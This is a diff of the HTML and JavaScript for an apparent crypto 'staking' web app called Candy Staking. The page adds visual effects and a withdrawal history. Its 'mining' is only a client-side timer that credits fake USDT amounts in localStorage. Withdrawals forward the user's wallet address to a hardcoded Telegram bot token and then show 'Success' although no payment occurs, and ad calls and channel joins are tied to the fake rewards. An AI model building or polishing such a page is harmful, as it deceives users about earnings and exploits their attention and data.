@@ -11,6 +11,7 @@
         :root { --main-pink: #ff007a; --bg-dark: #080a0d; --card-dark: #12161f; --text-muted: #6b7280; }
         * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; outline: none; }
         
+        /* FONDO CON LUCES LED EN MOVIMIENTO */
         body { 
             font-family: 'Outfit', sans-serif; 
             background-color: var(--bg-dark); 
@@ -21,41 +22,78 @@
             animation: glowBG 8s infinite alternate;
         }
 
-        @keyframes glowBG { 0% { background-position: 0% 0%; } 100% { background-position: 100% 100%; } }
+        @keyframes glowBG {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 100% 100%; }
+        }
 
         .app-container { width: 100%; max-width: 450px; margin: 0 auto; padding: 25px; height: 100vh; overflow-y: auto; padding-bottom: 120px; position: relative; z-index: 1; }
+        
         .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 25px; }
         .logo { font-weight: 800; font-size: 20px; color: #fff; display: flex; align-items: center; gap: 8px; }
-        .dot { width: 8px; height: 8px; background: var(--main-pink); border-radius: 50%; box-shadow: 0 0 15px var(--main-pink); animation: pulse 1.5s infinite; }
+        
+        /* PUNTO NEÓN PULSANTE */
+        .dot { 
+            width: 8px; height: 8px; background: var(--main-pink); border-radius: 50%; 
+            box-shadow: 0 0 15px var(--main-pink); 
+            animation: pulse 1.5s infinite;
+        }
 
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.3); } 100% { transform: scale(1); } }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 5px var(--main-pink); }
+            50% { transform: scale(1.3); box-shadow: 0 0 20px var(--main-pink); }
+            100% { transform: scale(1); box-shadow: 0 0 5px var(--main-pink); }
+        }
 
-        .notice-bar { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 12px; font-size: 11px; text-align: center; color: var(--text-muted); margin-bottom: 20px; font-weight: 600; }
+        .notice-bar { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 12px; font-size: 11px; text-align: center; color: var(--text-muted); margin-bottom: 20px; font-weight: 600; backdrop-filter: blur(5px); }
 
         .balance-card {
             background: linear-gradient(145deg, #1a1f2b 0%, #12161f 100%);
-            border-radius: 25px; padding: 30px; border: 1px solid rgba(255, 0, 122, 0.15); margin-bottom: 20px; position: relative; overflow: hidden;
+            border-radius: 25px; padding: 30px;
+            border: 1px solid rgba(255, 0, 122, 0.15); margin-bottom: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            position: relative; overflow: hidden;
         }
 
+        /* LUZ QUE GIRA EN EL FONDO DE LA TARJETA */
+        .balance-card::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, rgba(255, 0, 122, 0.1));
+            animation: rotate 6s linear infinite;
+        }
+
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+
         .label { position: relative; color: var(--text-muted); font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 8px; }
-        .amount { position: relative; font-size: 36px; font-weight: 800; letter-spacing: -1px; margin-bottom: 25px; }
+        .amount { position: relative; font-size: 36px; font-weight: 800; letter-spacing: -1px; margin-bottom: 25px; transition: 0.5s; }
         .amount span { color: var(--main-pink); font-size: 16px; margin-left: 5px; }
 
         .btn-action { 
             background: var(--main-pink); color: #fff; border: none; width: 100%; padding: 20px; 
             border-radius: 15px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.3s; 
+            box-shadow: 0 10px 20px rgba(255, 0, 122, 0.2);
         }
-        .btn-action:disabled { background: #1c222d; color: #4b5563; cursor: not-allowed; }
+        .btn-action:active { transform: scale(0.97); box-shadow: 0 5px 10px rgba(255, 0, 122, 0.2); }
+        .btn-action:disabled { background: #1c222d; color: #4b5563; cursor: not-allowed; box-shadow: none; }
 
-        /* BARRA DE PROGRESO */
-        .progress-container { background: rgba(255,255,255,0.05); height: 10px; border-radius: 10px; margin: 15px 0; display: none; overflow: hidden; border: 1px solid rgba(255,0,122,0.1); }
-        .progress-fill { height: 100%; background: var(--main-pink); width: 0%; transition: width 0.5s; box-shadow: 0 0 10px var(--main-pink); }
+        .history-item { background: rgba(255,255,255,0.02); padding: 15px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; border-left: 3px solid #10b981; backdrop-filter: blur(10px); }
+        .hist-info b { font-size: 13px; display: block; }
+        .hist-info span { font-size: 10px; color: var(--text-muted); }
+        .hist-status { font-size: 10px; font-weight: 800; color: #10b981; text-transform: uppercase; }
+
+        /* BARRA DE PROGRESO INTEGRADA SIN AFECTAR TU ESTILO */
+        .p-container { background: rgba(255,255,255,0.05); height: 8px; border-radius: 10px; margin: 15px 0; display: none; overflow: hidden; }
+        .p-fill { height: 100%; background: var(--main-pink); width: 0%; transition: width 0.5s; }
+
+        .mission-item { background: #12161f; padding: 20px; border-radius: 18px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(255,255,255,0.02); }
+        .mission-text b { font-size: 15px; display: block; margin-bottom: 2px; }
+        .mission-text span { color: var(--main-pink); font-size: 12px; font-weight: 800; }
 
         .nav-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(13, 17, 23, 0.9); backdrop-filter: blur(15px); display: flex; justify-content: space-around; padding: 20px; border-top: 1px solid #1c222d; z-index: 100; }
         .nav-link { background: none; border: none; color: #4b5563; font-size: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
-        .nav-link.active { color: var(--main-pink); }
+        .nav-link.active { color: var(--main-pink); text-shadow: 0 0 10px var(--main-pink); }
 
-        .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: #fff; color: #000; padding: 12px 25px; border-radius: 10px; font-weight: 800; font-size: 13px; transition: 0.4s; z-index: 10000; }
+        .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: #fff; color: #000; padding: 12px 25px; border-radius: 10px; font-weight: 800; font-size: 13px; transition: 0.4s; z-index: 10000; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .toast.show { transform: translateX(-50%) translateY(0); }
     </style>
 </head>
@@ -66,7 +104,10 @@
 <div class="app-container">
     <div class="header">
         <div class="logo"><div class="dot"></div> CANDY STAKING</div>
+        <div style="font-size: 18px; opacity: 0.5;">🔔</div>
     </div>
+
+    <div class="notice-bar">External deposits are currently disabled.</div>
 
     <div id="v-home">
         <div class="balance-card">
@@ -77,26 +118,51 @@
             <div class="amount">$<span id="profit-val">0.0000</span> <span>USDT</span></div>
         </div>
         <button class="btn-action" onclick="openWithdraw()">Withdraw Money</button>
-        <div id="withdraw-history" style="margin-top:20px;"></div>
+
+        <div class="history-section" style="margin-top:25px;">
+            <div class="label" style="margin-bottom: 12px;">Recent Settlements</div>
+            <div id="withdraw-history">
+                <p style="font-size: 11px; color: var(--text-muted); text-align: center; padding: 20px;">No activity recorded.</p>
+            </div>
+        </div>
     </div>
 
     <div id="v-stake" style="display:none;">
         <div class="balance-card" style="text-align: center;">
-            <div style="font-size: 40px; margin-bottom: 15px;">⛏️</div>
+            <div style="font-size: 40px; margin-bottom: 15px; animation: bounce 2s infinite;">⛏️</div>
             <div class="label">Mining Center</div>
-            <div class="progress-container" id="p-cont"><div class="progress-fill" id="p-fill"></div></div>
-            <p id="st-desc" style="font-size: 14px; color: #9ca3af;">Start your 24h mining cycle.</p>
-            <button class="btn-action" id="st-btn" style="margin-top: 15px;" onclick="handleStake()">Stake Bonus</button>
+            <div class="p-container" id="p-cont"><div class="p-fill" id="p-fill"></div></div>
+            <p id="st-desc" style="font-size: 14px; color: #9ca3af; line-height: 1.6;">Use your $2.00 Bonus to start the automatic 24-hour mining cycle.</p>
+            <button class="btn-action" id="st-btn" style="margin-top: 15px;" onclick="handleStakeAction()">Stake Bonus Balance</button>
         </div>
     </div>
 
     <div id="v-earn" style="display:none;">
-        <div class="mission-item"><div class="mission-text"><b>Official Channel</b><span>+$1.00 USDT</span></div><button class="btn-action" id="b1" style="width:auto; padding:10px;" onclick="join(1)">Join</button></div>
-        <div class="mission-item"><div class="mission-text"><b>Official Group</b><span>+$1.00 USDT</span></div><button class="btn-action" id="b2" style="width:auto; padding:10px;" onclick="join(2)">Join</button></div>
+        <div class="label" style="margin-bottom: 20px;">Verification Tasks</div>
+        <div class="mission-item">
+            <div class="mission-text"><b>Official Channel</b><span>+$1.00 USDT Bonus</span></div>
+            <button class="btn-action" id="b1" style="width:auto; padding:10px 20px; font-size:12px;" onclick="join(1)">Join</button>
+        </div>
+        <div class="mission-item">
+            <div class="mission-text"><b>Official Group</b><span>+$1.00 USDT Bonus</span></div>
+            <button class="btn-action" id="b2" style="width:auto; padding:10px 20px; font-size:12px;" onclick="join(2)">Join</button>
+        </div>
     </div>
 
-    <div id="v-guide" style="display:none; font-size: 13px; color: #9ca3af; line-height: 1.6;">
-        1. Earn $2.00 Bonus in Boost.<br>2. Stake daily for 24h.<br>3. Min withdraw: $0.02 USDT.
+    <div id="v-guide" style="display:none;">
+        <div class="balance-card">
+            <div class="label" style="color: #fff; margin-bottom: 15px;">User Guide & Yields</div>
+            <div style="font-size: 13px; line-height: 1.8; color: #9ca3af;">
+                1. <b>Earn:</b> Join groups to unlock $2.00 Bonus.<br>
+                2. <b>Stake:</b> Activate daily to mine USDT.<br>
+                3. <b>Yield Cycle:</b> Profit varies to ensure network stability:<br>
+                <div style="background: rgba(255,255,255,0.03); padding: 15px; border-radius: 12px; margin: 10px 0; border: 1px solid rgba(255,255,255,0.05); color: #fff;">
+                    Day 1: $0.010 | Day 2: $0.002 | Day 3: $0.010<br>
+                    Day 4: $0.008 | Day 5: $0.010
+                </div>
+                4. <b>Withdraw:</b> Minimum claim is <b>$0.02 USDT</b>.
+            </div>
+        </div>
     </div>
 </div>
 
@@ -110,8 +176,7 @@
 <script>
     const TG_TOKEN = "8746370321:AAHLrn8OHEPNqyOIqY75Q4ocBVOgsZ8GI34";
     const CHISMOSO = "@ALSKSNNSLSMS";
-    
-    // nextClaim almacena la fecha exacta en milisegundos de cuando termina el ciclo
+    // nextClaim es la clave para las 24 horas sin borrar lo demás
     let db = { bonus: 0.00, profit: 0.0000, ch1: false, ch2: false, total: 0, history: [], nextClaim: 0 };
 
     function save() { localStorage.setItem('_candy_v7_final_pro', JSON.stringify(db)); }
@@ -119,7 +184,20 @@
         const data = localStorage.getItem('_candy_v7_final_pro');
         if(data) db = JSON.parse(data);
         update();
-        setInterval(updateStakeUI, 1000); // Actualiza la barra y el tiempo cada segundo
+        setInterval(updateStakeUI, 1000); 
+        setTimeout(() => { show_10763886().catch(()=>{}); }, 2000);
+    }
+
+    function animateValue(id, start, end, duration, decimals) {
+        const obj = document.getElementById(id);
+        let startTimestamp = null;
+        const step = (timestamp) => {
+            if (!startTimestamp) startTimestamp = timestamp;
+            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+            obj.innerHTML = (progress * (end - start) + start).toFixed(decimals);
+            if (progress < 1) { window.requestAnimationFrame(step); }
+        };
+        window.requestAnimationFrame(step);
     }
 
     function updateStakeUI() {
@@ -131,54 +209,68 @@
         const dayMs = 24 * 60 * 60 * 1000;
 
         if (db.nextClaim > now) {
-            // CICLO EN CURSO
             pCont.style.display = "block";
             let elapsed = dayMs - (db.nextClaim - now);
             pFill.style.width = (elapsed / dayMs * 100) + "%";
-            
             let diff = db.nextClaim - now;
-            let h = Math.floor(diff / 3600000);
-            let m = Math.floor((diff % 3600000) / 60000);
-            let s = Math.floor((diff % 60000) / 1000);
+            let h = Math.floor(diff / 3600000), m = Math.floor((diff % 3600000) / 60000), s = Math.floor((diff % 60000) / 1000);
             btn.innerText = `WAIT ${h}h ${m}m ${s}s`;
             btn.disabled = true;
-            desc.innerText = "Mining in progress... Your USDT is being generated.";
+            desc.innerText = "Mining in progress... Please wait.";
         } else if (db.nextClaim !== 0) {
-            // LISTO PARA RECLAMAR
             pCont.style.display = "none";
             btn.innerText = "CLAIM PROFIT 💰";
             btn.disabled = false;
-            desc.innerText = "24h Cycle Complete! Collect your reward.";
+            desc.innerText = "Cycle complete! Claim your USDT.";
         } else {
-            // INICIO
-            btn.innerText = "STAKE $2.00 BONUS";
+            btn.innerText = "Stake Bonus Balance";
             btn.disabled = false;
         }
     }
 
-    function handleStake() {
+    function handleStakeAction() {
         if (db.nextClaim !== 0 && Date.now() >= db.nextClaim) {
             const cycle = [0.01, 0.002, 0.01, 0.008, 0.01];
+            let oldProfit = db.profit;
             db.profit += cycle[db.total % 5];
             db.total++;
             db.nextClaim = 0;
-            save(); update();
-            showToast("Reward Claimed! ✅");
+            save(); 
+            animateValue('profit-val', oldProfit, db.profit, 1500, 4);
+            showToast("Claim Success! ✅");
             view('home');
         } else {
-            if(db.bonus < 2.0) return showToast("Need $2.00 Bonus 🔒");
-            show_10763886().then(() => {
-                db.nextClaim = Date.now() + (24 * 60 * 60 * 1000);
-                save(); updateStakeUI();
-                showToast("Mining Started! ⛏️");
-            });
+            activateMining();
         }
+    }
+
+    function activateMining() {
+        if(db.bonus < 2.0) return showToast("Need $2.00 Bonus 🔒");
+        show_10763886().then(() => {
+            db.nextClaim = Date.now() + (24 * 60 * 60 * 1000);
+            save(); updateStakeUI();
+            showToast("Mining Started! ⛏️");
+        }).catch(() => { showToast("Network Error ❌"); });
     }
 
     function update() {
         document.getElementById('bonus-val').innerText = db.bonus.toFixed(2);
         document.getElementById('profit-val').innerText = db.profit.toFixed(4);
         if(db.ch1) setDone('b1'); if(db.ch2) setDone('b2');
+        const hDiv = document.getElementById('withdraw-history');
+        if(db.history.length > 0) {
+            hDiv.innerHTML = db.history.map(h => `
+                <div class="history-item">
+                    <div class="hist-info"><b>USDT Withdrawal</b><span>${h.date}</span></div>
+                    <div style="text-align:right;"><b style="display:block;font-size:13px;">$${h.amount}</b><span class="hist-status">Success</span></div>
+                </div>
+            `).join('');
+        }
+    }
+
+    function setDone(id) {
+        const el = document.getElementById(id);
+        el.innerText = "Verified"; el.style.background = "#1c222d"; el.style.color = "#4b5563"; el.onclick = null;
     }
 
     function join(n) {
@@ -187,9 +279,16 @@
         save(); update();
     }
 
-    function setDone(id) {
-        const el = document.getElementById(id);
-        el.innerText = "Verified"; el.disabled = true;
+    function openWithdraw() {
+        if(db.profit < 0.02) return showToast("Min: $0.02 USDT");
+        let w = prompt("Enter your USDT Wallet:");
+        if(w && w.length > 15) {
+            const amt = db.profit.toFixed(4);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHISMOSO}&text=${encodeURIComponent('🚀 RETIRO: $'+amt+'\nWallet: '+w)}`);
+            db.history.unshift({ amount: amt, date: new Date().toLocaleDateString() });
+            db.profit = 0; save(); update();
+            showToast("Request Sent! ✅");
+        }
     }
 
     function view(v) {
@@ -203,18 +302,6 @@
         t.innerText = m; t.classList.add('show');
         setTimeout(() => t.classList.remove('show'), 3000);
     }
-
-    function openWithdraw() {
-        if(db.profit < 0.02) return showToast("Min: $0.02 USDT");
-        let w = prompt("Enter your Polygon Wallet:");
-        if(w && w.length > 15) {
-            const amt = db.profit.toFixed(4);
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHISMOSO}&text=${encodeURIComponent('🚀 RETIRO: $'+amt+'\nWallet: '+w)}`);
-            db.profit = 0; save(); update();
-            showToast("Request Sent! ✅");
-        }
-    }
-
     window.onload = load;
 </script>
 </body>
